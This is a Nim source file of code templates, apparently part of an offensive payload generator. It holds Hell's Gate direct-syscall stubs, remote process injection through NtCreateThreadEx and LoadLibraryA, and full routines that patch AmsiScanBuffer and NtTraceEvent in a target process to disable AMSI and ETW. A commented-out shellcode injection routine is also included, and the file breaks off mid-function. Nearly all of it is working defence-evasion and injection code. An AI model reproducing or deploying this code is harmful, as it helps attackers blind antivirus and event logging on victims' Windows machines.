import strformat

let DInvokeGetModuleHandleADelegate* = """

type
  GetModuleHandleA_t* = proc(lpModuleName: LPCSTR): HMODULE {.stdcall.}

const
  GetModuleHandleA_HASH * = obf("GetModuleHandleA")

var MyGetModuleHandleA*: GetModuleHandleA_t

MyGetModuleHandleA = cast[GetModuleHandleA_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), GetModuleHandleA_HASH, 0, FALSE)))

"""

let HellsgateAllocDelegate*  = """

proc NtAllocateVirtualMemory(ProcessHandle: HANDLE, BaseAddress: PVOID, ZeroBits: ULONG, RegionSize: PSIZE_T, AllocationType: ULONG, Protect: ULONG): NTSTATUS {.asmNoStackFrame.} =
    asm ===
        mov r10, rcx
        mov eax, `syscall`
        syscall
        ret
    ===

var 
  ntAllocfuncHash        : uint64            = djb2_hash(obf("NtAllocateVirtualMemory"))
  ntAllocTable         : HG_TABLE_ENTRY    = HG_TABLE_ENTRY(dwHash : ntAllocfuncHash)
"""

let HellsgateNtOpenProcessDelegate*  = """

proc NtOpenProcess(ProcessHandle: PHANDLE, DesiredAccess: ACCESS_MASK, ObjectAttributes: POBJECT_ATTRIBUTES, ClientId: PCLIENT_ID): NTSTATUS {.asmNoStackFrame.} =
    asm ===
        mov r10, rcx
        mov eax, `syscall`
        syscall
        ret
    ===

var 
  ntOpenfuncHash        : uint64            = djb2_hash(obf("NtOpenProcess"))
  ntOpenTable         : HG_TABLE_ENTRY    = HG_TABLE_ENTRY(dwHash : ntOpenfuncHash)

"""

let HellsgateWriteDelegate*  = """


proc NtWriteVirtualMemory(ProcessHandle: HANDLE, BaseAddress: PVOID, Buffer: PVOID, NumberOfBytesToWrite: SIZE_T, NumberOfBytesWritten: PSIZE_T): NTSTATUS {.asmNoStackFrame.} =
    asm ===
        mov r10, rcx
        mov eax, `syscall`
        syscall
        ret
    ===

var 
  ntWritefuncHash        : uint64            = djb2_hash(obf("NtWriteVirtualMemory"))
  ntWriteTable         : HG_TABLE_ENTRY    = HG_TABLE_ENTRY(dwHash : ntWritefuncHash)

"""

let HellsgateProtectDelegate*  = """


proc NtProtectVirtualMemory(ProcessHandle: HANDLE, BaseAddress: PVOID, RegionSize: PSIZE_T, NewProtect: ULONG, OldProtect: PULONG): NTSTATUS {.asmNoStackFrame.} =
    asm ===
        mov r10, rcx
        mov eax, `syscall`
        syscall
        ret
    ===

var 
  ntProtectfuncHash        : uint64            = djb2_hash(obf("NtProtectVirtualMemory"))
  ntProtectTable         : HG_TABLE_ENTRY    = HG_TABLE_ENTRY(dwHash : ntProtectfuncHash)

"""

let HellsgateNtCreateThreadExDelegate*  = """

type
  PS_ATTR_UNION* {.pure, union.} = object
    Value*: ULONG
    ValuePtr*: PVOID
  PS_ATTRIBUTE* {.pure.} = object
    Attribute*: ULONG 
    Size*: SIZE_T
    u1*: PS_ATTR_UNION
    ReturnLength*: PSIZE_T
  PPS_ATTRIBUTE* = ptr PS_ATTRIBUTE
  PS_ATTRIBUTE_LIST* {.pure.} = object
    TotalLength*: SIZE_T
    Attributes*: array[2, PS_ATTRIBUTE]
  PPS_ATTRIBUTE_LIST* = ptr PS_ATTRIBUTE_LIST
  KNORMAL_ROUTINE* {.pure.} = object
    NormalContext*: PVOID
    SystemArgument1*: PVOID
    SystemArgument2*: PVOID
  PKNORMAL_ROUTINE* = ptr KNORMAL_ROUTINE

proc NtCreateThreadEx(ThreadHandle: PHANDLE, DesiredAccess: ACCESS_MASK, ObjectAttributes: POBJECT_ATTRIBUTES, ProcessHandle: HANDLE, StartRoutine: PVOID, Argument: PVOID, CreateFlags: ULONG, ZeroBits: SIZE_T, StackSize: SIZE_T, MaximumStackSize: SIZE_T, AttributeList: PPS_ATTRIBUTE_LIST): NTSTATUS {.asmNoStackFrame.} =
    asm ===
        mov r10, rcx
        mov eax, `syscall`
        syscall
        ret
    ===

var 
  ntCreatefuncHash        : uint64            = djb2_hash(obf("NtCreateThreadEx"))
  ntCreateTable         : HG_TABLE_ENTRY    = HG_TABLE_ENTRY(dwHash : ntCreatefuncHash)

"""

let HellsgateNtCloseDelegate*  = """


proc NtClose(Handle: HANDLE): NTSTATUS {.asmNoStackFrame.} =
    asm ===
        mov r10, rcx
        mov eax, `syscall`
        syscall
        ret
    ===

var 
  ntClosefuncHash        : uint64            = djb2_hash(obf("NtClose"))
  ntCloseTable         : HG_TABLE_ENTRY    = HG_TABLE_ENTRY(dwHash : ntClosefuncHash)

"""


let HellsgateRemotePatchAMSIStub* = """

proc remoteLoadAmsi(processID: var DWORD): bool =

   
    # C:\windows\system32\amsi.dll
    var friendlycode: array[28, char]  = [char(0x43), char(0x3A), char(0x5C), char(0x77), char(0x69), char(0x6E), char(0x64),
     char(0x6F), char(0x77), char(0x73), char(0x5C), char(0x73), char(0x79), char(0x73), char(0x74), char(0x65), char(0x6D),
     char(0x33), char(0x32), char(0x5C), char(0x61), char(0x6D), char(0x73), char(0x69),char(0x2E), char(0x64), char(0x6C), char(0x6C)]


    echo "[*] Target Process: ", processID

    var status: NTSTATUS
    var success: BOOL
    var cid: CLIENT_ID
    var oa: OBJECT_ATTRIBUTES
    var pHandle: HANDLE
    var tHandle: HANDLE
    var ds: LPVOID
    var sc_size: SIZE_T = cast[SIZE_T](friendlycode.len)

    cid.UniqueProcess = processID

    if getSyscall(ntOpenTable):
        syscall = ntOpenTable.wSysCall
    else:
        echo obf("[-] Failed to find opcode for NtOpenProcess")
    
    status = NtOpenProcess(
        &pHandle,
        PROCESS_ALL_ACCESS, 
        &oa, &cid         
    )

    echo obf("[*] NtOpenProcess: "), status

    if getSyscall(ntAllocTable):
        syscall = ntAllocTable.wSysCall
    else:
        echo obf("[-] Failed to find opcode for NtAllocateVirtualMemory")

    status = NtAllocateVirtualMemory(
        pHandle, &ds, 0, &sc_size, 
        MEM_COMMIT, 
        PAGE_EXECUTE_READWRITE)
    echo obf("[*] NtAllocateVirtualMemory: "), status
    var bytesWritten: SIZE_T

    if getSyscall(ntWriteTable):
        syscall = ntWriteTable.wSysCall
    else:
        echo obf("[-] Failed to find opcode for NtWriteVirtualMemory")

    status = NtWriteVirtualMemory(
        pHandle, 
        ds, 
        unsafeAddr friendlycode, 
        sc_size-1, 
        addr bytesWritten)

    echo obf("[*] NtWriteVirtualMemory: "), status
    echo obf("    \\-- bytes written: "), bytesWritten
    echo obf("")

    if getSyscall(ntCreateTable):
        syscall = ntCreateTable.wSysCall
    else:
        echo obf("[-] Failed to find opcode for NtCreateThreadEx")
    var pfnThreadRtn: LPTHREAD_START_ROUTINE = cast[LPTHREAD_START_ROUTINE](GetProcAddress(GetModuleHandle("Kernel32.dll"), "LoadLibraryA"));
    status = NtCreateThreadEx(
        &tHandle, 
        THREAD_ALL_ACCESS, 
        NULL, 
        pHandle,
        pfnThreadRtn, 
        ds, FALSE, 0, 0, 0, NULL)

    if getSyscall(ntCloseTable):
        syscall = ntCloseTable.wSysCall
    else:
        echo obf("[-] Failed to find opcode for NtClose")

    status = NtClose(tHandle)
    status = NtClose(pHandle)
    if(status == 0):
      return true
    else:
      return false


proc RemotePatchAmsi(hProcss :HANDLE): bool =

    when defined amd64:
        let patch: array[1, byte] = [byte 0x74] # Credit to @MrUn1k0d3r - https://players.brightcove.net/3755095886001/default_default/index.html?videoId=6308564004112
        #let patch: array[6, byte] = [byte 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3]
    elif defined i386:
        #let patch: array[8, byte] = [byte 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00]
        let patch: array[1, byte] = [byte 0x74] # Credit to @MrUn1k0d3r - https://players.brightcove.net/3755095886001/default_default/index.html?videoId=6308564004112


    var disabled: bool = false
   
    var RemoteHandle = GetRemoteModuleHandle(hProcss, obf("amsi.dll"))
    if RemoteHandle == 0:
        echo obf("[X] Failed to get amsi.dll handle")
        return disabled

    var RemoteProc = GetRemoteProcAddress(hProcss, RemoteHandle,obf("AmsiScanBuffer"))
    if RemoteProc == NULL:
        echo obf("[X] Failed to get the address of 'AmsiScanBuffer'")
        return disabled
    RemoteProc = RemoteProc + 0x83 # Credit to @MrUn1k0d3r - https://players.brightcove.net/3755095886001/default_default/index.html?videoId=6308564004112
    var oldProtection: DWORD = 0
    var success: BOOL
    var protectAddress = RemoteProc

    var friendlycodeLength = cast[SIZE_T](patch.len)
    var t: ULONG
    var op: ULONG
    var 
        status          : NTSTATUS          = 0x00000000
        buffer          : LPVOID


    if getSyscall(ntProtectTable):
                
        syscall = ntProtectTable.wSysCall
        status = NtProtectVirtualMemory(hProcss, addr protectAddress,addr friendlycodeLength,0x04,addr t)
                
        if not NT_SUCCESS(status):
            echo obf("[-] Failed to allocate memory.")
        else:
            echo obf("[*] Applying Syscall ETW patch")
    else:
        echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")

    var 
        bytesWritten: SIZE_T

    if getSyscall(ntWriteTable):

        syscall = ntWriteTable.wSysCall
        var outLength: SIZE_T
        status = NtWriteVirtualMemory(hProcss,RemoteProc,unsafeAddr patch,patch.len,addr outLength)

        if not NT_SUCCESS(status):
            echo obf("[-] Failed to write memory.")
        else:
            echo obf("[+] NtWriteVirtualMemory Succeed!")
                
               
    else:
        echo obf("[-] Failed to find opcode for NtWriteVirtualMemory")

    if getSyscall(ntProtectTable):
                
        syscall = ntProtectTable.wSysCall
        status = NtProtectVirtualMemory(hProcss,addr protectAddress,addr friendlycodeLength,cast[ULONG](t),addr op)
                
        if not NT_SUCCESS(status):
            echo obf("[-] Failed to allocate memory.")
        else:
            echo obf("[+] OldProtect set back")
            disabled = true
    else:
        echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")


    #if WriteProcessMemory(hProcss, RemoteProc, unsafeAddr patch, cast[SIZE_T](patch.len), NULL) == 0:
    #    echo obf("Failed to write process memory")
    #    return disabled
    #else:
    #    disabled = true
    return disabled

when isMainModule:
    var hProcams = OpenProcess(PROCESS_ALL_ACCESS, FALSE, remoteProcID)
    success = RemotePatchAmsi(hProcams)
    if (success == 0):
        success = remoteLoadAmsi(remoteProcID)
        HowMuchTimeWouldYoulikeToSleep(2)
        success = RemotePatchAmsi(hProcams)
    echo obf("[*] AMSI disabled in the remote process: ") & fmt"{bool(success)}"

"""

let HellsgateRemotePatchETWStub* = """

proc remoteLoadNtdll(processID: var DWORD): bool =

    # C:\windows\system32\ntdll.dll
    var friendlycode: array[29, char]  = [char(0x43), char(0x3A), char(0x5C), char(0x77), char(0x69), char(0x6E), char(0x64),
    char(0x6F), char(0x77), char(0x73), char(0x5C), char(0x73), char(0x79), char(0x73), char(0x74), char(0x65), char(0x6D),
    char(0x33), char(0x32), char(0x5C), char(0x6E), char(0x74), char(0x64), char(0x6C),
    char(0x6C), char(0x2E), char(0x64), char(0x6C), char(0x6C)]


    echo "[*] Target Process: ", processID

    var status: NTSTATUS
    var success: BOOL
    var cid: CLIENT_ID
    var oa: OBJECT_ATTRIBUTES
    var pHandle: HANDLE
    var tHandle: HANDLE
    var ds: LPVOID
    var sc_size: SIZE_T = cast[SIZE_T](friendlycode.len)

    cid.UniqueProcess = processID

    if getSyscall(ntOpenTable):
        syscall = ntOpenTable.wSysCall
    else:
        echo obf("[-] Failed to find opcode for NtOpenProcess")
    
    status = NtOpenProcess(
        &pHandle,
        PROCESS_ALL_ACCESS, 
        &oa, &cid         
    )

    echo obf("[*] NtOpenProcess: "), status

    if getSyscall(ntAllocTable):
        syscall = ntAllocTable.wSysCall
    else:
        echo obf("[-] Failed to find opcode for NtAllocateVirtualMemory")

    status = NtAllocateVirtualMemory(
        pHandle, &ds, 0, &sc_size, 
        MEM_COMMIT, 
        PAGE_EXECUTE_READWRITE)
    echo obf("[*] NtAllocateVirtualMemory: "), status
    var bytesWritten: SIZE_T

    if getSyscall(ntWriteTable):
        syscall = ntWriteTable.wSysCall
    else:
        echo obf("[-] Failed to find opcode for NtWriteVirtualMemory")

    status = NtWriteVirtualMemory(
        pHandle, 
        ds, 
        unsafeAddr friendlycode, 
        sc_size-1, 
        addr bytesWritten)

    echo obf("[*] NtWriteVirtualMemory: "), status
    echo obf("    \\-- bytes written: "), bytesWritten
    echo obf("")

    if getSyscall(ntCreateTable):
        syscall = ntCreateTable.wSysCall
    else:
        echo obf("[-] Failed to find opcode for NtCreateThreadEx")
    var pfnThreadRtn: LPTHREAD_START_ROUTINE = cast[LPTHREAD_START_ROUTINE](GetProcAddress(GetModuleHandle("Kernel32.dll"), "LoadLibraryA"));
    status = NtCreateThreadEx(
        &tHandle, 
        THREAD_ALL_ACCESS, 
        NULL, 
        pHandle,
        pfnThreadRtn, 
        ds, FALSE, 0, 0, 0, NULL)

    if getSyscall(ntCloseTable):
        syscall = ntCloseTable.wSysCall
    else:
        echo obf("[-] Failed to find opcode for NtClose")

    status = NtClose(tHandle)
    status = NtClose(pHandle)
    if(status == 0):
      return true
    else:
      return false
#[
    let pHandle = OpenProcess(
        PROCESS_ALL_ACCESS, 
        false, 
        cast[DWORD](processID)
    )
    defer: CloseHandle(pHandle)

    echo "[*] pHandle: ", pHandle

    let rPtr = VirtualAllocEx(
        pHandle,
        NULL,
        cast[SIZE_T](shellcode.len),
        MEM_COMMIT,
        PAGE_EXECUTE_READ_WRITE
    )

    var bytesWritten: SIZE_T
    let wSuccess = WriteProcessMemory(
        pHandle, 
        rPtr,
        addr shellcode,
        cast[SIZE_T](shellcode.len),
        addr bytesWritten
    )
    
    when defined(DInvoke):
        var pfnThreadRtn: LPTHREAD_START_ROUTINE = cast[LPTHREAD_START_ROUTINE](MyGetProcAddress(MyGetModuleHandleA(r"Kernel32.dll"), r"LoadLibraryA"))
    else:
        let pfnThreadRtn: LPTHREAD_START_ROUTINE = cast[LPTHREAD_START_ROUTINE](GetProcAddress(GetModuleHandle("Kernel32.dll"), "LoadLibraryA"))
 
    echo "[*] WriteProcessMemory: ", bool(wSuccess)
    echo "    \\-- bytes written: ", bytesWritten
    echo ""

    let tHandle = CreateRemoteThread(
        pHandle, 
        NULL,
        0,
        pfnThreadRtn,
        rPtr, 
        0, 
        NULL
    )
    defer: CloseHandle(tHandle)

    echo "[*] tHandle: ", tHandle
    echo "[+] Injected"

    var oldProtect: PDWORD = nil
    var status = NtProtectVirtualMemory(pHandle, rPtr, cast[SIZE_T](shellcode.len),PAGE_READWRITE,oldProtect)
    echo $GetLastError()
    echo status
    ]#

proc RemotePatchEtw(hProcess : HANDLE) : bool =

    when defined amd64:
        let patch: array[1, byte] = [byte 0xc3]
    elif defined i386:
        let patch: array[4, byte] = [byte 0xc2, 0x14, 0x00, 0x00]

    
    var disabled: bool = false
    var RemoteHandle = GetRemoteModuleHandle(hProcess, obf("ntdll.dll"))
    if RemoteHandle == 0:
        echo obf("[X] Failed to get ntdll.dll handle")
        return disabled

    var RemoteProc = GetRemoteProcAddress(hProcess, RemoteHandle,obf("NtTraceEvent"))
    if RemoteProc == NULL:
        echo obf("[X] Failed to get the address of 'NtTraceEvent'")
        return disabled

    var oldProtection: DWORD = 0
    var success: BOOL
    var protectAddress = RemoteProc

    var friendlycodeLength = cast[SIZE_T](patch.len)
    var t: ULONG
    var op: ULONG
    var 
        status          : NTSTATUS          = 0x00000000
        buffer          : LPVOID


    if getSyscall(ntProtectTable):
                
        syscall = ntProtectTable.wSysCall
        status = NtProtectVirtualMemory(hProcess, addr protectAddress,addr friendlycodeLength,0x04,addr t)
                
        if not NT_SUCCESS(status):
            echo obf("[-] Failed to allocate memory.")
        else:
            echo obf("[*] Applying Syscall ETW patch")
    else:
        echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")

    var 
        bytesWritten: SIZE_T

    if getSyscall(ntWriteTable):

        syscall = ntWriteTable.wSysCall
        var outLength: SIZE_T
        status = NtWriteVirtualMemory(hProcess,RemoteProc,unsafeAddr patch,patch.len,addr outLength)

        if not NT_SUCCESS(status):
            echo obf("[-] Failed to write memory.")
        else:
            echo obf("[+] NtWriteVirtualMemory Succeed!")
                
               
    else:
        echo obf("[-] Failed to find opcode for NtWriteVirtualMemory")

    if getSyscall(ntProtectTable):
                
        syscall = ntProtectTable.wSysCall
        status = NtProtectVirtualMemory(hProcess,addr protectAddress,addr friendlycodeLength,cast[ULONG](t),addr op)
                
        if not NT_SUCCESS(status):
            echo obf("[-] Failed to allocate memory.")
        else:
            echo obf("[+] OldProtect set back")
            disabled = true
    else:
        echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")


    #if WriteProcessMemory(hProcess, RemoteProc, unsafeAddr patch, cast[SIZE_T](patch.len), NULL) == 0:
    #    echo obf("Failed to write process memory")
    #    return disabled
    #else:
    #    disabled = true
    return disabled

when isMainModule:
    when defined(DInvoke):
        var hProcetw = MyOpenProcess(PROCESS_ALL_ACCESS, FALSE, remoteProcID)
    else:
        var hProcetw = OpenProcess(PROCESS_ALL_ACCESS, FALSE, remoteProcID)
    success = RemotePatchEtw(hProcetw)
    if (success == 0):
        success = remoteLoadNtdll(remoteProcID)
        HowMuchTimeWouldYoulikeToSleep(2)
        success = RemotePatchEtw(hProcetw)
    echo obf("[*] ETW disabled in the remote process: ") & fmt"{bool(success)}"
    
"""

let HellsgateStub*  = """

when defined(Hellsgate):

    from os import paramStr
    
    {.passC:"-masm=intel".}
    
        #[
            Windows Undocumented Structures - Windows 7+
        ]#
    
    type
        # https://doxygen.reactos.org/d3/d71/struct__ASSEMBLY__STORAGE__MAP__ENTRY.html
        ASSEMBLY_STORAGE_MAP {.pure.} = object
            Flags*      : ULONG
            DosPath*    : UNICODE_STRING
            Handle*     : HANDLE
        PASSEMBLY_STORAGE_MAP* = ptr ASSEMBLY_STORAGE_MAP
    
        LDR_DLL_LOAD_REASON* {.pure.} = enum
            LoadReasonUnknown                       = -1
            LoadReasonStaticDependency              = 0
            LoadReasonStaticForwarderDependency     = 1
            LoadReasonDynamicForwarderDependency    = 2
            LoadReasonDelayloadDependency           = 3
            LoadReasonDynamicLoad                   = 4
            LoadReasonAsImageLoad                   = 5
            LoadReasonAsDataLoad                    = 6
            LoadReasonEnclavePrimary                = 7
            LoadReasonEnclaveDependency             = 8
    
        RTL_BALANCED_NODE_STRUCT1* {.pure.} = object
            Left* : PRTL_BALANCED_NODE
            Right* : PRTL_BALANCED_NODE
    
        RTL_BALANCED_NODE_UNION1* {.pure, union.} = object
            Children* : array[2, PRTL_BALANCED_NODE]
            Struct1*  : RTL_BALANCED_NODE_STRUCT1
    
        RTL_BALANCED_NODE_UNION2* {.pure, union.} = object
            Red*        {.bitsize:1.}   : UCHAR
            Balance*    {.bitsize:2.}   : UCHAR
            ParentValue*                : ULONG_PTR
    
        RTL_BALANCED_NODE* {.pure.} = object
            Union1* : RTL_BALANCED_NODE_UNION1
            Union2* : RTL_BALANCED_NODE_UNION2
        PRTL_BALANCED_NODE* = ptr RTL_BALANCED_NODE
    
        LDR_DATA_TABLE_ENTRY_UNION_ONE* {.pure, union.} = object
            InInitializationOrderLinks*  : LIST_ENTRY
            InProgressLinks*             : LIST_ENTRY
        PLDR_DATA_TABLE_ENTRY_UNION_ONE* = ptr LDR_DATA_TABLE_ENTRY_UNION_ONE
    
        LDR_DATA_TABLE_ENTRY_STRUCT_ONE* {.pure.} = object
            PackagedBinary* {.bitsize:1.}           : ULONG
            MarkedForRemoval* {.bitsize:1.}         : ULONG
            ImageDll* {.bitsize:1.}                 : ULONG
            LoadNotificationSent* {.bitsize:1.}     : ULONG
            TelemetryEntryProcessed* {.bitsize:1.}  : ULONG
            ProcessStaticImport* {.bitsize:1.}      : ULONG
            InLegacyLists* {.bitsize:1.}            : ULONG
            InIndexes* {.bitsize:1.}                : ULONG
            ShimDll* {.bitsize:1.}                  : ULONG
            InExceptionTable* {.bitsize:1.}         : ULONG
            ReservedFlags1* {.bitsize:2.}           : ULONG
            LoadInProgress* {.bitsize:1.}           : ULONG
            LoadConfigProcessed* {.bitsize:1.}      : ULONG
            EntryProcessed* {.bitsize:1.}           : ULONG
            ProtectDelayLoad* {.bitsize:1.}         : ULONG
            ReservedFlags3* {.bitsize:2.}           : ULONG
            DontCallForThreads* {.bitsize:1.}       : ULONG
            ProcessAttachCalled* {.bitsize:1.}      : ULONG
            ProcessAttachFailed* {.bitsize:1.}      : ULONG
            CorDeferredValidate* {.bitsize:1.}      : ULONG
            CorImage* {.bitsize:1.}                 : ULONG
            DontRelocate {.bitsize:1.}              : ULONG
            CorILOnly* {.bitsize:1.}                : ULONG
            ChpeImage* {.bitsize:1.}                : ULONG
            ReservedFlags5* {.bitsize:2.}           : ULONG
            Redirected* {.bitsize:1.}               : ULONG
            ReservedFlags6* {.bitsize:2.}           : ULONG
            CompatDatabaseProcessed* {.bitsize:1.}  : ULONG
    
        LDR_DATA_TABLE_ENTRY_UNION_TWO* {.pure, union.} = object
            FlagGroup*   : array[4, UCHAR]
            Flags*       : ULONG
            Struct*      : LDR_DATA_TABLE_ENTRY_STRUCT_ONE            
        PLDR_DATA_TABLE_ENTRY_UNION_TWO* = ptr LDR_DATA_TABLE_ENTRY_UNION_TWO
        
        LDR_DATA_TABLE_ENTRY* {.pure.} = object
            InLoadOrderLinks*               : LIST_ENTRY
            InMemoryOrderLinks*             : LIST_ENTRY
            Union_1*                        : LDR_DATA_TABLE_ENTRY_UNION_ONE
            DLLBase*                        : PVOID
            EntryPoint*                     : PVOID
            SizeOfImage*                    : ULONG
            FullDllName*                    : UNICODE_STRING
            BaseDllName*                    : UNICODE_STRING
            Union_2*                        : LDR_DATA_TABLE_ENTRY_UNION_TWO
            ObsoleteLoadCount               : USHORT
            TlsIndex*                       : USHORT
            HashLinks*                      : LIST_ENTRY
            TimeDateStamp*                  : ULONG
            EntryPointActivationContext*    : PVOID
            Lock*                           : PVOID
            DdgagNode*                      : PVOID       # PLDR_DDAG_NODE
            NodeModuleLink*                 : LIST_ENTRY
            LoadContext*                    : PVOID       # PLDRP_LOAD_CONTEXT
            ParentDllBase                   : PVOID
            SwitchBackContext*              : PVOID
            BaseAddressIndexNode*           : RTL_BALANCED_NODE
            MappingInfoIndexNode*           : RTL_BALANCED_NODE
            OriginalBase*                   : ULONG_PTR
            LoadTime*                       : LARGE_INTEGER
            BaseNameHashValue*              : ULONG
            LoadReason*                     : LDR_DLL_LOAD_REASON
            ImplicitPathOptions*            : ULONG
            ReferenceCount*                 : ULONG
            DependentLoadFlags*             : ULONG
            SigningLevel*                   : UCHAR
        PLDR_DATA_TABLE_ENTRY* = ptr LDR_DATA_TABLE_ENTRY
    
        PEB_LDR_DATA* {.pure.} = object
            Length*                             : ULONG
            Initialized*                        : BOOLEAN
            SsHandle*                           : PVOID
            InLoadOrderModuleList*              : LIST_ENTRY
            InMemoryOrderModuleList*            : LIST_ENTRY
            InInitializationOrderModuleList*    : LIST_ENTRY
            EntryInProgress*                    : PVOID
            ShutdownInProgress*                 : BOOLEAN
            ShutdownThreadId*                   : HANDLE
        PPEB_LDR_DATA* = ptr PEB_LDR_DATA
    
        PEB* {.pure.} = object
            InheritedAddressSpace*                  : BOOLEAN
            ReadImageFileExecOptions*               : BOOLEAN
            BeingDebugged*                          : BOOLEAN
            PebUnion1*                              : UCHAR
            Padding0*                               : array[4, UCHAR]
            Mutant*                                 : HANDLE
            ImageBaseAddress*                       : PVOID
            Ldr*                                    : PPEB_LDR_DATA                             
            ProcessParameters*                      : PRTL_USER_PROCESS_PARAMETERS  
            SubSystemData*                          : PVOID                         
            ProcessHeap*                            : HANDLE                        
            FastPebLock*                            : PVOID          # PRTL_CRITICAL_SECTION
            AtlThunkSListPtr*                       : PVOID                         
            IFEOKey*                                : PVOID                         
            PebUnion2*                              : ULONG                         
            Padding1*                               : array[4, UCHAR]               
            KernelCallBackTable*                    : ptr PVOID                     
            SystemReserved*                         : ULONG                         
            AltThunkSListPtr32*                     : ULONG                         
            ApiSetMap*                              : PVOID                         
            TlsExpansionCounter*                    : ULONG                         
            Padding2*                               : array[4, UCHAR]               
            TlsBitmap*                              : PVOID                         
            TlsBitmapBits*                          : array[2, ULONG]               
            ReadOnlyShareMemoryBase*                : PVOID                         
            SharedData*                             : PVOID                         
            ReadOnlyStaticServerData*               : ptr PVOID                     
            AnsiCodePageData*                       : PVOID                         
            OemCodePageData*                        : PVOID                         
            UnicodeCaseTableData*                   : PVOID                         
            NumberOfProcessors*                     : ULONG                         
            NtGlobalFlag*                           : ULONG                         
            CriticalSectionTimeout*                 : LARGE_INTEGER                 
            HeapSegmentReserve*                     : ULONG_PTR                     
            HeapSegmentCommit*                      : ULONG_PTR                     
            HeapDeCommitTotalFreeThreshold*         : ULONG_PTR                     
            HeapDeCommitFreeBlockThreshold*         : ULONG_PTR                     
            NumberOfHeaps*                          : ULONG                         
            MaximumNumberOfHeaps*                   : ULONG                         
            ProcessHeaps*                           : ptr PVOID                     
            GdiSharedHandleTable*                   : PVOID                         
            ProcessStarterHelper*                   : PVOID                         
            GdiDCAttributeList*                     : ULONG                         
            Padding3*                               : array[4, UCHAR]               
            LoaderLock*                             : PVOID           # PRTL_CRITICAL_SECTION
            OSMajorVersion*                         : ULONG
            OSMinorVersion*                         : ULONG
            OSBuildNumber*                          : USHORT
            OSCSDVersion*                           : USHORT
            OSPlatformId*                           : ULONG
            ImageSubsystem*                         : ULONG
            ImageSubsystemMajorVersion*             : ULONG
            ImageSubsystemMinorVersion*             : ULONG
            Padding4                                : array[4, UCHAR]
            ActiveProcessAffinityMask*              : PVOID            # KAFFINITY
            GdiHandleBuffer                         : array[0x3c, ULONG]
            PostProcessInitRoutine*                 : VOID
            TlsExpansionBitmap*                     : PVOID
            TlsExpansionBitmapBits*                 : array[0x20, ULONG]
            SessionId*                              : ULONG
            Padding5*                               : array[4, UCHAR]
            AppCompatFlags*                         : ULARGE_INTEGER
            AppCompatFlagsUser*                     : ULARGE_INTEGER
            ShimData*                               : PVOID
            AppCompatInfo*                          : PVOID
            CSDVersion*                             : UNICODE_STRING
            ActivationContextData*                  : PVOID             # PACTIVATION_CONTEXT_DATA 
            ProcessAssemblyStorageMap*              : PVOID             # PASSEMBLY_STORAGE_MAP
            SystemDefaultActivationContextData*     : PVOID             # PACTIVATION_CONTEXT_DATA
            SystemAssemblyStorageMap*               : PVOID             # PASSEMBLY_STORAGE_MAP
            MinimumStackCommit*                     : ULONG_PTR
            Sparepointers*                          : array[4, PVOID]
            SpareUlongs*                            : array[5, ULONG]
            WerRegistrationData*                    : PVOID
            WerShipAssertPtr*                       : PVOID
            Unused*                                 : PVOID
            ImageHeaderHash*                        : PVOID
            TracingFlags*                           : ULONG
            CsrServerReadOnlySharedMemoryBase*      : ULONGLONG
            TppWorkerpListLock*                     : ULONG
            TppWorkerpList*                         : LIST_ENTRY
            WaitOnAddressHashTable*                 : array[0x80, PVOID]
            TelemtryCoverageHeader*                 : PVOID
            CloudFileFlags*                         : ULONG
            CloudFileDiagFlags*                     : ULONG
            PlaceholderCompatabilityMode*           : CHAR
            PlaceholderCompatabilityModeReserved*   : array[7, CHAR]
            LeapSecondData*                         : PVOID
            LeapSecondFlags*                        : ULONG
            NtGlobalFlag2*                          : ULONG
        PPEB* = ptr PEB
    
        TEB* {.pure.} = object
            NtTib*                                  : NT_TIB
            EnvironmentPointer*                     : PVOID
            ClientId*                               : CLIENT_ID
            ActiveRpcHandle*                        : PVOID
            ThreadLocalStoragePointer*              : PVOID
            ProcessEnvironmentBlock*                : PEB
            LastErrorValue*                         : ULONG
            CountOfOwnedCriticalSections*           : ULONG
            CsrClientThread*                        : PVOID
            Win32ThreadInfo*                        : PVOID
            User32Reserved*                         : array[0x1A, ULONG]
            UserReserved*                           : array[5, ULONG]
            WOW32Reserved*                          : PVOID
            CurrentLocale*                          : ULONG
            FpSoftwareStatusRegister*               : ULONG
            ReservedForDebuggerInstrumentation*     : array[0x10, PVOID]
        PTEB* = ptr TEB
    
    
    
    
    
    var syscall*  : WORD
    type
        HG_TABLE_ENTRY* = object
            pAddress*    : PVOID
            dwHash*      : uint64
            wSysCall*    : WORD
        PHG_TABLE_ENTRY* = ptr HG_TABLE_ENTRY
    
    proc djb2_hash*(pFuncName : cstring) : uint64 =
    
        var hash : uint64 = 0x5381
    
        for c in pFuncName:
            hash = ((hash shl 0x05) + hash) + cast[uint64](ord(c))
    
        return hash
    
    proc moduleToBuffer*(pCurrentModule : PLDR_DATA_TABLE_ENTRY) : PWSTR =
        return pCurrentModule.FullDllName.Buffer
    
    proc flinkToModule*(pCurrentFlink : LIST_ENTRY) : PLDR_DATA_TABLE_ENTRY =
        return cast[PLDR_DATA_TABLE_ENTRY](cast[ByteAddress](pCurrentFlink) - 0x10)
    
    proc getExportTable*(pCurrentModule : PLDR_DATA_TABLE_ENTRY, pExportTable : var PIMAGE_EXPORT_DIRECTORY) : bool =
    
        let 
            pImageBase : PVOID              = pCurrentModule.DLLBase
            pDosHeader : PIMAGE_DOS_HEADER  = cast[PIMAGE_DOS_HEADER](pImageBase)
            pNTHeader : PIMAGE_NT_HEADERS = cast[PIMAGE_NT_HEADERS](cast[ByteAddress](pDosHeader) + pDosHeader.e_lfanew)
    
        if pDosheader.e_magic != IMAGE_DOS_SIGNATURE:
            return false
    
        if pNTHeader.Signature != cast[DWORD](IMAGE_NT_SIGNATURE):
            return false
    
        pExportTable = cast[PIMAGE_EXPORT_DIRECTORY](cast[ByteAddress](pImageBase) + pNTHeader.OptionalHeader.DataDirectory[0].VirtualAddress)
    
        return true
    
    proc getTableEntry*(pImageBase : PVOID, pCurrentExportDirectory : PIMAGE_EXPORT_DIRECTORY, tableEntry : var HG_TABLE_ENTRY) : bool =
    
        var 
            cx : DWORD = 0
            numFuncs : DWORD = pCurrentExportDirectory.NumberOfNames
        let 
